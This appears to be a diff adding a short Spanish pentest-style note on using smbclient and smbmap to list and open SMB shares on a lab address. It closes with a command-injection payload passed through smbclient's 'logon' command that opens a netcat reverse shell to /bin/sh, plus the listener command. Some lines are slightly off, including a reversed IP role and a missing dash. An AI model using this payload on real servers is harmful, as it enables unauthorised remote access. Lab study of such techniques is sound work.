@@ -1,0 +1,21 @@
+smbclient es una herramienta de línea de comandos que se utiliza para acceder a recursos compartidos en una red que utilizan el protocolo SMB (Server Message Block), que es un protocolo de red para compartir archivos, impresoras y otros recursos entre nodos en una red. Es comúnmente utilizado en entornos Windows. Para conectar a un servidor SMB, puedes usar el siguiente comando:
+
+smbclient //nombre_del_servidor/nombre_del_recurso -U nombre_de_usuario  
+
+smbclient te pedirá la contraseña del usuario especificado con la opción -U.  
+
+Comando para que nos liste las rutas compartidas:
+smbclient -L //10.0.2.5 
+
+Este comando nos dirá los permisos que tenemos para las rutas compartidas
+smbmap -H 10.0.2.5
+
+Para conectarnos a esa ruta compartida que encontramos usamos: 
+smbclient //10.0.2.5/tmp  (tmp en este caso sería la ruta que tendriamos acceso y permisos de escritura y lectura) 
+
+Con help vemos todos los comandos disponibles que tenemos para usar
+
+Ejemplo de utilizacion de un comando :
+
+logon "/= `nc 10.0.2.5 4444 -e /bin/sh´ "
+nc lvnp 4444 (abrimos en escucha el puerto 4444 con netcat)
